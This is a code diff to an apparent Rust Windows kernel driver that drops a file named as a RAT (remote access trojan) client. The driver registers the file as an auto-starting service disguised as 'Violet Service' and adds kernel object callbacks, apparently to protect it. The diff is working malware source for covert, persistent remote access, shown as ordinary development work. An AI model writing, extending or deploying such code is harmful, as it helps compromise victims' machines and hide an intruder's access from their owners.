@@ -13,21 +13,21 @@ use wdk_sys::{
     FILE_ATTRIBUTE_NORMAL, FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT, GENERIC_WRITE, HANDLE,
     IO_STATUS_BLOCK, KEY_ALL_ACCESS, LARGE_INTEGER, NTSTATUS, OBJ_CASE_INSENSITIVE,
     OBJ_KERNEL_HANDLE, OBJECT_ATTRIBUTES, PDRIVER_OBJECT, REG_EXPAND_SZ, REG_OPTION_NON_VOLATILE,
-    REG_SZ, STATUS_OBJECT_NAME_COLLISION, SYNCHRONIZE, THREAD_ALL_ACCESS, UNICODE_STRING,
+    REG_SZ, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, SERVICE_WIN32_OWN_PROCESS,
+    STATUS_OBJECT_NAME_COLLISION, SYNCHRONIZE, THREAD_ALL_ACCESS, UNICODE_STRING,
 };
 use widestring::{U16CStr, Utf16Str, u16cstr};
 
-use crate::global::{RAT_CLIENT, RAT_CLIENT_OBJ_PATH, RAT_CLIENT_PATH, SERVICE_REGISTRY};
+use crate::global::{RAT_CLIENT, RAT_CLIENT_OBJ_PATH, RAT_CLIENT_SERVICE_PATH, SERVICE_REGISTRY};
+use crate::handlers::object;
 use crate::log;
 use crate::wrappers::bindings::InitializeObjectAttributes;
 use crate::wrappers::registry;
 
-unsafe extern "C" fn thread_routine(_: *mut c_void) {
-    let mut sleep = LARGE_INTEGER {
-        QuadPart: -50000000,
-    };
+unsafe extern "C" fn initialize_thread_routine(_: *mut c_void) {
+    let mut sleep = LARGE_INTEGER { QuadPart: -3000000 };
     loop {
-        if do_drop_file().is_ok() {
+        if initialize().is_ok() {
             break;
         }
 
@@ -75,22 +75,22 @@ fn setup_service_registry(path: &U16CStr) -> anyhow::Result<()> {
 
     // Reference: https://learn.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree
     for status in [
+        registry::registry_write_string(
+            key,
+            u16cstr!("DisplayName"),
+            u16cstr!("Violet Service"),
+            REG_SZ,
+        ),
+        registry::registry_write_string(
+            key,
+            u16cstr!("Description"),
+            u16cstr!("Violet Service"),
+            REG_SZ,
+        ),
         registry::registry_write_string(key, u16cstr!("ImagePath"), path, REG_EXPAND_SZ),
-        registry::registry_write_dword(
-            key,
-            u16cstr!("Type"),
-            0x10, // SERVICE_WIN32_OWN_PROCESS
-        ),
-        registry::registry_write_dword(
-            key,
-            u16cstr!("Start"),
-            0x2, // SERVICE_AUTO_START
-        ),
-        registry::registry_write_dword(
-            key,
-            u16cstr!("ErrorControl"),
-            0x1, // SERVICE_ERROR_NORMAL
-        ),
+        registry::registry_write_dword(key, u16cstr!("Type"), SERVICE_WIN32_OWN_PROCESS),
+        registry::registry_write_dword(key, u16cstr!("Start"), SERVICE_AUTO_START),
+        registry::registry_write_dword(key, u16cstr!("ErrorControl"), SERVICE_ERROR_NORMAL),
         registry::registry_write_string(
             key,
             u16cstr!("ObjectName"),
@@ -170,15 +170,20 @@ fn drop_file() -> anyhow::Result<()> {
     Ok(())
 }
 
-fn do_drop_file() -> anyhow::Result<()> {
+fn initialize() -> anyhow::Result<()> {
     drop_file()
-        .inspect(|_| match setup_service_registry(RAT_CLIENT_PATH) {
+        .inspect(|_| match setup_service_registry(RAT_CLIENT_SERVICE_PATH) {
             Ok(_) => info!("Service registry setup successfully"),
             Err(e) => info!("Failed to setup service registry: {e}"),
         })
         .inspect_err(|e| {
             error!("Failed to drop RAT client: {e}");
-        })
+        })?;
+
+    object::ob_register_callbacks().inspect_err(|e| {
+        error!("Failed to register object callbacks: {e}");
+    })?;
+    Ok(())
 }
 
 pub fn driver_entry_prehook(
@@ -195,7 +200,7 @@ pub fn driver_entry_prehook(
             ptr::null_mut(),
             ptr::null_mut(),
             ptr::null_mut(),
-            Some(thread_routine),
+            Some(initialize_thread_routine),
             ptr::null_mut(),
         )
     };
